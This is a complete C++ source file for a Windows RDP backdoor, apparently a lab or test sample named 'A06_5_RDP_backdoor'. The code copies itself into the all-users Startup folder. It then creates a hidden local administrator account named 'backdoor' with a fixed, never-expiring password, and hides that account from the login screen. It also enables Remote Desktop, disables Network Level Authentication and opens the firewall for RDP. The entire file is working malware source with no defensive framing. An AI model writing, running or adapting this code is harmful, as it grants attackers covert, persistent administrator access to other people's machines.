#include <windows.h>
#include <lm.h>
#include <shlobj.h>
#include <netfw.h>
#include <iostream>
#include <string>

// Linker Pragmas
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// Configuration Constants
const wchar_t *TARGET_EXE_NAME = L"A06_5_RDP_backdoor.exe";
const wchar_t *BACKDOOR_USER = L"backdoor";
const wchar_t *BACKDOOR_PASS = L"P@ssw0rd123!";

// Helper function to check if running from the System Startup Folder
bool IsRunningFromSystemStartup(const std::wstring &currentPath, const std::wstring &startupDir)
{
    return currentPath.find(startupDir) != std::wstring::npos;
}

// Phase 1: Self-Installation to the System-Wide (All Users) Startup Folder
bool InstallToSystemStartupFolder()
{
    wchar_t currentPath[MAX_PATH];
    wchar_t systemStartupPath[MAX_PATH];

    GetModuleFileNameW(NULL, currentPath, MAX_PATH);

    // CSIDL_COMMON_STARTUP targets: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    if (SHGetFolderPathW(NULL, CSIDL_COMMON_STARTUP, NULL, 0, systemStartupPath) == S_OK)
    {
        std::wstring targetPath = std::wstring(systemStartupPath) + L"\\" + TARGET_EXE_NAME;

        if (!IsRunningFromSystemStartup(currentPath, systemStartupPath))
        {
            // Copy binary to the global persistence location
            if (CopyFileW(currentPath, targetPath.c_str(), FALSE))
            {
                return true; // Successfully installed
            }
        }
    }
    return false;
}

// Phase 2: Native Account Creation, RDP Configuration, NLA Disabling, and Firewall Modification
bool ConfigureRDPBackdoor()
{
    USER_INFO_1 ui;
    DWORD dwError = 0;

    // 1. Establish the Local User Account Structure
    ui.usri1_name = const_cast<LPWSTR>(BACKDOOR_USER);
    ui.usri1_password = const_cast<LPWSTR>(BACKDOOR_PASS);
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD; // Password never expires
    ui.usri1_script_path = NULL;

    // Call NetUserAdd natively to avoid launching net.exe
    NET_API_STATUS nStatus = NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
    if (nStatus != NERR_Success && nStatus != NERR_UserExists)
    {
        return false;
    }

    // 2. Add User to Local Administrators Group
    LOCALGROUP_MEMBERS_INFO_3 lmi;
    lmi.lgrmi3_domainandname = const_cast<LPWSTR>(BACKDOOR_USER);
    NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&lmi, 1);

    // 3. Hide Account from Windows Welcome/Login Screen via Registry Modification
    HKEY hKey;
    const wchar_t *specialAccountsPath = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList";

    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, specialAccountsPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS)
    {
        DWORD dwData = 0; // Value 0 ensures concealment from the UI
        RegSetValueExW(hKey, BACKDOOR_USER, 0, REG_DWORD, (const BYTE *)&dwData, sizeof(dwData));
        RegCloseKey(hKey);
    }

    // 4. Enable Remote Desktop (Modify Terminal Server setting)
    const wchar_t *terminalServerPath = L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server";
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, terminalServerPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
    {
        DWORD dwDenyConnections = 0; // 0 = Allow connections
        RegSetValueExW(hKey, L"fDenyTSConnections", 0, REG_DWORD, (const BYTE *)&dwDenyConnections, sizeof(dwDenyConnections));
        RegCloseKey(hKey);
    }

    // 5. Explicitly Disable Network Level Authentication (NLA) to ensure FreeRDP connects cleanly
    const wchar_t *rdpTcpPath = L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp";
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, rdpTcpPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
    {
        DWORD dwUserAuthentication = 0; // 0 = Disable NLA requirement
        RegSetValueExW(hKey, L"UserAuthentication", 0, REG_DWORD, (const BYTE *)&dwUserAuthentication, sizeof(dwUserAuthentication));
        RegCloseKey(hKey);
    }

    // 6. Natively Enable the "Remote Desktop" Firewall Rule Group via COM
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (SUCCEEDED(hr) || hr == RPC_E_CHANGED_MODE)
    {
        INetFwPolicy2 *pNetFwPolicy2 = NULL;
        hr = CoCreateInstance(
            CLSID_NetFwPolicy2,
            NULL,
            CLSCTX_INPROC_SERVER,
            IID_INetFwPolicy2,
            (void **)&pNetFwPolicy2);

        if (SUCCEEDED(hr))
        {
            BSTR groupName = SysAllocString(L"Remote Desktop");
            pNetFwPolicy2->EnableRuleGroup(NET_FW_PROFILE2_ALL, groupName, VARIANT_TRUE);
            SysFreeString(groupName);
            pNetFwPolicy2->Release();
        }
        CoUninitialize();
    }

    return true;
}

// Application Entry Point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    wchar_t currentPath[MAX_PATH];
    wchar_t systemStartupPath[MAX_PATH];

    GetModuleFileNameW(NULL, currentPath, MAX_PATH);
    SHGetFolderPathW(NULL, CSIDL_COMMON_STARTUP, NULL, 0, systemStartupPath);

    // Context Evaluation
    if (!IsRunningFromSystemStartup(currentPath, systemStartupPath))
    {
        // Step 1: Execute staging copy to C:\ProgramData\...\Startup (Requires Admin context once to drop)
        InstallToSystemStartupFolder();
    }
    else
    {
        // Step 2: Running from global persistence trigger; run account and network configuration
        ConfigureRDPBackdoor();
    }

    return 0;
}